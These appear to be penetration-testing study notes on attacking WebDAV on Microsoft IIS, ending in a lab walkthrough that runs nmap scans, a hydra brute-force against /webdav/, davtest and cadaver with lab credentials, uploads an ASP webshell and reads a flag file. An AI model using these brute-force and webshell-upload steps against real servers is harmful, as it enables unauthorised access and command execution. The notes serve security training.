Microsoft IIS
	- IIS (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family.
	- It can be used to host websites/web apps and provides administrators with a robust GUI for managing websites.
	- IIS can be used to host both static and dynamic web pages developed in ASP.NET and PHP.
	- Typically configured to run on ports 80/443.
	- Supported executable file extensions: `.asp`, `.aspx`, `.config`, `.php`

WebDAV
	- WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.
	- WebDAV essentially enables a web server to function as a file server for collaborative authoring.
	- WebDAV runs on top Microsoft IIS on ports 80/443.
	- In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.

WebDAV Exploitation
	- The first step of the exploitation process would involve identifying whether WebDAV has been configured to run on the IIS web server.
	- The default directory where `webdav` is hosted is `/webdav/`.
	- We can perform a brute-force attack on the WebDAV server in order to identify legitimate credentials that we can use for authentication.
	- After obtaining legitimate credentials, we can authenticate with the WebDAV server and upload a malicious .asp payload that can be used to execute arbitrary commands or obtain a reverse shell on the target.

Tools used for WebDAV Exploitation
	- davtest
		- davtest is used to scan, authenticate and exploit a WebDAV server.
		- Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.
	- cadaver
		- cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers.
		- Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.

Practical Demonstration
	- `sudo nmap -sV -sC 10.2.17.124`
	- `sudo nmap -sV -p 80 --script=http-enum 10.2.17.124`
	- The 401 Unauthorized result for `/webdav/` depicted in the Nmap Script scan signifies that authentication is enabled for the `webdav` service hosted on the web server.
	- We can use the web browser to verify that `webdav` is hosted on the web server by navigating to the `/webdav/` directory.
	- Using hydra to perform brute-force attacks:
		- `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/`
	- The username and password have been provided in the lab to prevent us from spending time on performing a bruteforce attack, the username is `bob` and the password is `password_123321`.
	- `davtest`
	- `davtest -url http://10.2.17.124/webdav`
	- `davtest -auth bob:password_123321 -url http://10.2.17.124/webdav`
	- davtest here checks for a connection, and permissions for: folder creation, upload (file formats), and execution (file formats).
	- `cadaver --help`
	- `cadaver http://10.2.17.124/webdav`
		- `bob`
		- `password_123321`
		- `ls`
		- `ls -a /usr/share/webshells/asp`
		- `put /usr/share/webshells/asp/webshell.asp`
	 - The web-shell we used provides us with command execution on the server when the file is executed through a browser.
		- `whoami`
		- `ipconfig`
		- `dir C:\`
		- `type C:\flag.txt`
